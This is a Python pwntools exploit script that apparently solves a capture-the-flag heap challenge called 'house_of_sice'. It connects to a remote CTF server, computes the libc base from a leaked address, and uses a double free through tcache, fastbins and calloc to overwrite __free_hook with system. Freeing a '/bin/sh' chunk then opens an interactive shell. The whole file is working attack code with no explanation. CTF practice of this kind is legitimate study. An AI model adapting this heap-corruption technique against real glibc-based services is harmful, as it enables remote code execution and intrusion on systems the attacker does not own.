#!/usr/bin/env python3

from pwn import *

exe = ELF("./house_of_sice_patched")
libc = ELF("./libc-2.31.so")
ld = ELF("./ld-2.31.so")

context.binary = exe


def conn():
    r = process([exe.path])
    return r


#r = conn()
r = remote("house-of-sice.hsc.tf", 1337)

def calloc(number):
    r.sendlineafter("> ", "1")
    r.sendlineafter("> ", "2")
    r.sendlineafter("> ", str(number))


def malloc(number):
    r.sendlineafter("> ", "1")
    r.sendlineafter("> ", "1")
    r.sendlineafter("> ", str(number))

def free(index):
    r.sendlineafter("> ", "2")
    r.sendlineafter("> ", str(index))

def main():
    r.recvuntil("deet: ")
    system  = int(r.recv(14), 16)
    libc.address = system - libc.sym['system']
    log.warn("Libc base @ 0x%x", libc.address)

    for i in range(8):
        malloc(1)

    for i in range(8):
        free(i)

    malloc(2)
    
    free(7)

    calloc(libc.sym['__free_hook'])
    malloc(u64("/bin/sh\x00"))
    malloc(system)

    free(7)
    
    r.interactive()


if __name__ == "__main__":
    main()
